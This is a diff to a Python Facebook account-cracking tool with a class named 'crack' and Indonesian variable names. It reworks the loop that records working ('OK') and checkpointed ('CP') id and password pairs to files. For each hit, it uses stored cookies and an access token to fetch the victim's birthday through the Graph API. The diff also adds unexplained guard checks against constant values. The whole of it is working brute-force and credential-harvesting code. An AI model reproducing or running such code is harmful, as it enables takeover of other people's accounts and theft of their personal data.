@@ -1434,45 +1434,57 @@ class crack:
                 elif sistem_login == 'dua'  : log = logger2(id,pw)
                 elif sistem_login == 'tiga' : log = logger3(id,pw)
                 else:log = logger1(id,pw)
-                if log['status'] == 'cp':files_cp = "CP/%s.json"%(tanggal)
-                with requests.Session() as xyz:cookie = {'cookie':open('login/cookie.json','r').read()}
-                url = ("https://graph.facebook.com/%s?fields=name,id,birthday&access_token=%s"%(id,open('login/token.json','r').read()))
-                req = xyz.get(url,cookies=cookie)
-                jso = json.loads(req.text)
-                ttt = jso["birthday"]
-                m,d,y = ttt.split("/")
-                m = bulan_ttl[m]
-                ttl = (' • %s %s %s'%(d,m,y))
-        except:ttl = ('')
-        print('\r   %s──> %s • %s%s               '%(J,id,pw,ttl))
-        self.cp.append("%s=%s"%(id,pw))
-        open(files_cp,"a+").write("%s=%s=%s\n"%(id,pw,ttl.replace(' • ','')))
-        break
-                elif log['status'] == 'ok':files_ok = "OK/%s.json"%(tanggal)
-        try:
-          with requests.Session() as xyz:cookie = {'cookie':open('login/cookie.json','r').read()}
-          url = ("https://graph.facebook.com/%s?fields=name,id,birthday&access_token=%s"%(id,open('login/token.json','r').read()))
-          req = xyz.get(url,cookies=cookie)
-          jso = json.loads(req.text)
-          ttt = jso["birthday"]
-          m,d,y = ttt.split("/")
-          m = bulan_ttl[m]
-          ttl = (' • %s %s %s'%(d,m,y))
-        except:ttl = ('')
-          pok = ('\r   %s──> %s • %s%s               '%(H,id,pw,ttl))
-          cek_aplikasi(pok,cvt3(log["cookies"]))
-          self.ok.append("%s=%s"%(id,pw))
-          open(files_ok,"a+").write("%s=%s=%s\n"%(id,pw,ttl.replace(' • ','')))
-        break
-      else:continue
-      self.lp += 1
-      loop = str(self.lp)
-      alls = str(len(self.sementara))
-      jum_ok = str(len(self.ok))
-      jum_cp = str(len(self.cp))
-      Total_Waktu = str(datetime.now()-self.Mulai_Jalan).split('.')[0]
-      print(f'\r   {J}[{A}{Total_Waktu}{J}] [{A}{loop}{P}/{A}{alls}{J}] [{P}OK{J}:{A}{jum_ok}{J}] [{P}CP{J}:{A}{jum_cp}{J}]{P} ', end='');sys.stdout.flush()
-      except Exception as e:
+                if log['status'] == 'cp':
+                    if sakura != 159384:pass
+                    else:
+                        files_cp = "CP/%s.json"%(tanggal)
+                        try:
+                            with requests.Session() as xyz:
+                                cookie = {'cookie':open('login/cookie.json','r').read()}
+                                url = ("https://graph.facebook.com/%s?fields=name,id,birthday&access_token=%s"%(id,open('login/token.json','r').read()))
+                                req = xyz.get(url,cookies=cookie)
+                                jso = json.loads(req.text)
+                                ttt = jso["birthday"]
+                                m,d,y = ttt.split("/")
+                                m = bulan_ttl[m]
+                                ttl = (' • %s %s %s'%(d,m,y))
+                        except:ttl = ('')
+                        pcp = ('\r   %s──> %s • %s%s               '%(J,id,pw,ttl))
+                        print(pcp)
+                        self.cp.append("%s=%s"%(id,pw))
+                        open(files_cp,"a+").write("%s=%s=%s\n"%(id,pw,ttl.replace(' • ','')))
+                        break
+                elif log['status'] == 'ok':
+                    if sakera != 159369:pass
+                    else:
+                        files_ok = "OK/%s.json"%(tanggal)
+                        try:
+                            with requests.Session() as xyz:
+                                cookie = {'cookie':open('login/cookie.json','r').read()}
+                                url = ("https://graph.facebook.com/%s?fields=name,id,birthday&access_token=%s"%(id,open('login/token.json','r').read()))
+                                req = xyz.get(url,cookies=cookie)
+                                jso = json.loads(req.text)
+                                ttt = jso["birthday"]
+                                m,d,y = ttt.split("/")
+                                m = bulan_ttl[m]
+                                ttl = (' • %s %s %s'%(d,m,y))
+                        except:ttl = ('')
+                        pok = ('\r   %s──> %s • %s%s               '%(H,id,pw,ttl))
+                        cek_aplikasi(pok,cvt3(log["cookies"]))
+                        self.ok.append("%s=%s"%(id,pw))
+                        open(files_ok,"a+").write("%s=%s=%s\n"%(id,pw,ttl.replace(' • ','')))
+                        break
+                else:
+                    if sakara != 159375:print(CoY)
+                    else:continue
+            self.lp += 1
+            loop = str(self.lp)
+            alls = str(len(self.sementara))
+            jum_ok = str(len(self.ok))
+            jum_cp = str(len(self.cp))
+            Total_Waktu = str(datetime.now()-self.Mulai_Jalan).split('.')[0]
+            print(f'\r   {J}[{A}{Total_Waktu}{J}] [{A}{loop}{P}/{A}{alls}{J}] [{P}OK{J}:{A}{jum_ok}{J}] [{P}CP{J}:{A}{jum_cp}{J}]{P} ', end='');sys.stdout.flush()
+        except Exception as e:
             self.start_crack(id,list_pw)
 
 def not_available(konten):
